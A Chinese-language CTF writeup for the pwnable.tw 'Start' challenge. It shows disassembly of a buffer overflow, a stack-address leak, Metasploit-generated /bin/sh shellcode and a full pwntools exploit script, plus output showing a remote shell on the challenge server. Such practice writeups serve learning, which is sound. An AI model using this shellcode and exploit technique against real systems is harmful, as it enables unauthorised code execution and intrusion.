---

title: pwnable.tw writeup - Start
lang: zh
layout: article
show_subscribe: false
tags: [ctf,pwn]

---

跟我一起用热门渗透测试框架 [metasploit](https://www.metasploit.com/) rock ！

题目链接: [Start 100 pts](https://pwnable.tw/challenge/#1) 

## Start [100 pts]

**检查保护：**

```bash
$  checksec start
[*] '/home/z1933/workplace/vbshare/ctf/start'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)

```

`NX disabled` 表明可以在栈上执行指令。

拉到IDA中反汇编分析发现其输入输出是作者自己纯手写,程序有缓冲区溢出。

IDA反汇编输出：

```
.text:08048060 public _start
.text:08048060 _start proc near              ; DATA XREF: LOAD:08048018↑o
.text:08048060 push    esp
.text:08048061 push    offset _exit
.text:08048066 xor     eax, eax
.text:08048068 xor     ebx, ebx
.text:0804806A xor     ecx, ecx
.text:0804806C xor     edx, edx
.text:0804806E push    ':FTC'
.text:08048073 push    ' eht'
.text:08048078 push    ' tra'
.text:0804807D push    'ts s'
.text:08048082 push    2774654Ch
.text:08048087 mov     ecx, esp              ; addr
.text:08048089 mov     dl, 14h               ; len
.text:0804808B mov     bl, 1                 ; fd
.text:0804808D mov     al, 4
.text:0804808F int     80h                   ; LINUX - sys_write
.text:0804808F
.text:08048091 xor     ebx, ebx
.text:08048093 mov     dl, '<'
.text:08048095 mov     al, 3
.text:08048097 int     80h                   ; LINUX -
.text:08048097
.text:08048099 add     esp, 20
.text:0804809C retn
```

分析可以发现返回地址在 `输入位置` + `0x14=20` 的位置。 指令地址`0x08048087`处让 `ecx` 存写的起始地址。

调试分析发现如果让 `retn` 时回到 `0x08048087` 指令位置，让它输出一遍此时 `esp` 所指向的内容会引起栈地址泄露。

拿到一个可用的栈地址之后,调试算一下偏移，发现 `新的返回地址 = 泄露的返回地址+0x14` 。 可解。


这里我是用 `pwntool + IDA 附加进程` 的方式调试的。


**用 [metasploit](https://www.metasploit.com/) 生成 payload**

```bash
z1933@1933:~/workplace 
$ sudo msfconsole -q
msf6 > 

```

**找到我们想要的payload**

```bash
msf6 > search type:payload platform:linux arch:x86 -S exec

Matching Modules
================

   #   Name                                              Disclosure Date  Rank    Check  Description
   -   ----                                              ---------------  ----    -----  -----------
   21  payload/linux/x86/exec                                             normal  No     Linux Execute Command


Interact with a module by name or index. For example info 37, use 37 or use payload/linux/x86/read_file

msf6 > use 21
msf6 payload(linux/x86/exec) > info 

       Name: Linux Execute Command
     Module: payload/linux/x86/exec
   Platform: Linux
       Arch: x86
Needs Admin: No
 Total size: 20
       Rank: Normal

Provided by:
  vlad902 <vlad902@gmail.com>
  Geyslan G. Bem <geyslan@gmail.com>

Basic options:
Name  Current Setting  Required  Description
----  ---------------  --------  -----------
CMD                    no        The command string to execute

Description:
  Execute an arbitrary command or just a /bin/sh shell

```

`-S exec` 表示过滤。看起来是我们想要的。生成 python 的形式方便 pwntool 使用。


```bash
msf6 payload(linux/x86/exec) > set NullFreeVersion true
NullFreeVersion => true
msf6 payload(linux/x86/exec) > generate -f python
# linux/x86/exec - 21 bytes
# https://metasploit.com/
# VERBOSE=false, PrependFork=false, PrependSetresuid=false, 
# PrependSetreuid=false, PrependSetuid=false, 
# PrependSetresgid=false, PrependSetregid=false, 
# PrependSetgid=false, PrependChrootBreak=false, 
# AppendExit=false, NullFreeVersion=true
buf =  b""
buf += b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68"
buf += b"\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
msf6 payload(linux/x86/exec) > 

```

`set NullFreeVersion true` 是用 `show advanced` 命令查看高级参数设置然后设置的。


**攻击脚本：**

```python
# coding: utf-8
from pwn import *

# Set target environment
context(os='linux', arch='i386')


mov_ecx = 0x08048087
print(p32(mov_ecx))

io=None

if len(sys.argv) == 1 : 
    io=process('./start')
else:
    log.info("remote start")
    # 鉴于国内网络环境,设置代理,后面是你代理服务器的地址和端口
    context.proxy=(socks.SOCKS5,'localhost',7890)
    io=remote('chall.pwnable.tw',10000)

io.recvuntil(":")
# stack leak

stack_leak=b"a"*0x14
stack_leak+=p32(mov_ecx)
io.send(stack_leak)

addr=io.recvn(4)
addr=u32(addr)
print("stack leak:{}".format(hex(addr)))

# send shell_code
buf = b'b'*0x14
buf +=  p32(addr+0x14)
buf += b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68"
buf += b"\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

io.send(buf)
io.interactive()

```

**运行结果:**

```bash
z1933@1933:~/workplace/vbshare/ctf 
$ python3 pwntool.py -r
b'\x87\x80\x04\x08'
[*] remote start
[+] Opening connection to chall.pwnable.tw on port 10000: Done
pwntool.py:21: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.recvuntil(":")
stack leak:0xffbd7750
[*] Switching to interactive mode
\x00\x00\x8f\xbd\xff\x00\x00G\x8f\xbd\xff$ whoami
start
$ ls -la
total 80
drwxr-xr-x   1 root  root  4096 Nov 14  2019 .
drwxr-xr-x   1 root  root  4096 Nov 14  2019 ..
-rwxr-xr-x   1 root  root     0 Nov 14  2019 .dockerenv
drwxr-xr-x   1 root  root  4096 Jan 13  2017 bin
drwxr-xr-x   2 root  root  4096 Apr 12  2016 boot
drwxr-xr-x   5 root  root   340 Sep 16  2021 dev
drwxr-xr-x   1 root  root  4096 Nov 14  2019 etc
drwxr-xr-x   1 root  root  4096 Nov 14  2019 home
drwxr-xr-x   1 root  root  4096 Jan 13  2017 lib
drwxr-xr-x   2 root  root  4096 Jan 13  2017 lib32
drwxr-xr-x   2 root  root  4096 Dec 13  2016 lib64
drwxr-xr-x   2 root  root  4096 Jan 13  2017 libx32
drwxr-xr-x   2 root  root  4096 Dec 13  2016 media
drwxr-xr-x   2 root  root  4096 Dec 13  2016 mnt
drwxr-xr-x   2 root  root  4096 Dec 13  2016 opt
dr-xr-xr-x 598 root  root     0 Sep 16  2021 proc
drwx------   2 root  root  4096 Dec 13  2016 root
drwxrwxr--   1 root  root  4096 Jan 13  2017 run
drwxr-xr-x   1 root  root  4096 Jan 13  2017 sbin
drwxr-xr-x   2 root  root  4096 Dec 13  2016 srv
dr-xr-xr-x  13 root  root     0 Sep 17  2021 sys
drwxr-xr--   2 start start 4096 Jan 13  2017 tmp
drwxr-xr-x   1 root  root  4096 Jan 13  2017 usr
drwxr-xr-x   1 root  root  4096 Jan 13  2017 var
$  

```

